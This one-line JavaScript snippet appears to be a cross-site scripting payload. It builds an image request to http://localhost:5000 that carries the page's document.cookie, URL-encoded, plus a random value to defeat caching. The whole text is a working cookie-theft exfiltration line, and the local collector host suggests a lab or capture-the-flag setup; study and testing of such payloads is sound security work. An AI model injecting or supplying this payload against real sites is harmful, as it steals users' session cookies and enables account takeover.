(new Image()).src = 'http://localhost:5000?' + 'payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();
